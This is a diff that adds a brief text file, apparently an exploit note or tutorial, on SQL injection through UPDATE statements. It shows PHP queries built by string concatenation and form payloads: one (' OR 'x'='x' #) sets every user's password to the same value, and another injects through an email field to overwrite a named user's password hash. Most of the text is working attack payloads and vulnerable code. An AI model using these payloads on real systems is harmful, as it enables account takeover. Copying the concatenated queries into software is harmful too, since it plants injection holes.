@@ -1,0 +1,40 @@
+1--> Injection [UPDATE Statement]:
+----------------------------------
+$checkpasssql = "SELECT USER_NAME FROM users WHERE USER_NAME = '" . $username . "'" . " AND PASSWORD ='" . $password . "'";
+
+$updatepasssql = "UPDATE users SET PASSWORD = '" . $password_new . "' WHERE USER_NAME = '". $username . "'" ;
+
+HTML Form POST:
+---------------
+Value Name 			Value Data
+----------			-----------
+username 				username' OR 'x'='x' #
+password
+password1 			newpassword
+password2 			newpassword
+
+SQL Query is: SELECT USER_NAME FROM users WHERE USERNAME='username' OR 'x' = 'x' #'AND PASSWORD='..........'.
+SQL QUERY is: UPDATE users SET PASSWORD='.....' WHERE USER_NAME = 'username' OR 'x' = 'x' #'.
+
+The Result: All The Users will have the same Password, because the update statements always success.
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+2--> UPDATE Statement Injection [Example]:
+------------------------------------------
+$updateemailsql = "UPDATE USERS SET EMAIL = '" . $email . "' WHERE USER_NAME = '" . $username . "' AND PASSWORD = '" . $password . "'";
+
+HTML Form POST:
+---------------
+Value Name 				Value Data
+----------				----------
+username 					crackhead
+
+password
+
+email1						hacked@email.com', PASSWORD ='f86bab76a040fd185c26789b3ee896f6' WHERE USER_NAME = 'donkeytr0n' #
+
+email2						hacked@email.com', PASSWORD ='f86bab76a040fd185c26789b3ee896f6' WHERE	USER_NAME = 'donkeytr0n' #
+
+SQL Query is: UPDATE USERS SET EMAIL='.... ', PASSWORD='.....' WHERE USER_NAME='....' #'...........
+
+Result: Username/Password Combination Incoreect. (because the username not found in db).
+	
